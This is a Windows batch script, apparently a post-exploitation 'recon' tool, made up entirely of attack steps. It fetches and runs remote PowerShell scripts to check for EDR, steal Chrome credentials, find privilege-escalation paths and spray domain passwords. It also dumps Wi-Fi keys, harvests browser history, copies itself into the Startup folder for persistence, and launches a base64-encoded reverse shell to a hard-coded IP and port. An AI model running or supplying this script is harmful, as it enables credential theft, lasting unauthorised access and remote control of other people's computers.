echo Full Recon Started
echo Check For EDR
powershell.exe "iex (iwr https://raw.githubusercontent.com/bleszily/pwn-windows/main/Discovery/Check_EDR_Presence.ps1);Invoke-EDRCheck" >> C:\Windows\Temp\Check_EDR_Presence.txt
echo EDR Check Completed

echo STARTING HOST RECON
powershell.exe "wget https://raw.githubusercontent.com/bleszily/pwn-windows/main/Discovery/Host_Recon_Complete.bat -o C:\Windows\Temp\Host_Recon_Complete.bat;C:\Windows\Temp\Host_Recon_Complete.bat;del C:\Windows\Temp\Host_Recon_Complete.bat"
echo HOST RECON COMPLETED at C:\Windows\Temp\Host_Recon_Complete.txt

echo RETRIEVING CHROME PASSWORDS
powershell.exe "iex (iwr https://raw.githubusercontent.com/bleszily/pwn-windows/main/Get-ChromeCreds2/Get-ChromeCreds2.ps1);" >> C:\Windows\Temp\Chorme_PW.txt
echo CHROME PASSWORDS RETRIEVED

echo RETRIEVING Awesome Details
powershell.exe "iex (iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1);" >> C:\Windows\Temp\PowerUp.txt
echo Awesome Details RETRIEVED

echo Attempting Password Spray
powershell.exe "iex (iwr https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1);" >> C:\Windows\Temp\PasswordSpray.txt
echo Password Spray Completed

echo GET WIFI PASSWORDS
powershell.exe -Command """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SID_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize""" >> C:\Windows\Temp\Wifi_PW.txt
echo WIFI PASSWORDS RETRIEVED

echo GET_BROWSER_DATA
powershell.exe iwr https://github.com/bleszily/pwn-windows/raw/main/PasswordStealer/BrowsingHistoryView.exe -o C:\Windows\Temp\Browser_History_View.exe;C:\Windows\Temp\Browser_History_View.exe /stext C:\Windows\Temp\Browsers_History.txt; Sleep 10; del C:\Windows\Temp\Browser_History_View.exe
echo BROWSER DATA RETRIEVED

REM ####EXTRA####
REM echo SCREENSHOT
REM powershell.exe "iex (iwr https://raw.githubusercontent.com/bleszily/pwn-windows/main/Discovery/Take_ScreenShot.ps1);New-ScreenShot -Full -Path C:\Windows\Temp\ScreenShot.jpg"
REM echo SCREENSHOT TAKEN

REM echo GET OUTLOOK PASSWORD
REM powershell.exe wget https://github.com/bleszily/pwn-windows/raw/main/PasswordStealer/mailpv.exe -o C:\Windows\Temp\mailpv.exe;C:\Windows\Temp\mailpv.exe /stext C:\Windows\Temp\mailpv.txt
REM echo OUTLOOK PASSWORD RETRIEVED

REM echo SOUND RECORDER WIN 7
REM soundrecorder /FILE C:\Windows\Temp\audio.wma /DURATION 00:00:10
REM echo SOUND RECORDED

echo SET PERSISTENCE
copy C:\Windows\Temp\RECON.bat "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\recon.bat" 
echo PERSISTENCE DONE

echo START REVERSE SHELL
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADgALgAxADAAMwAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=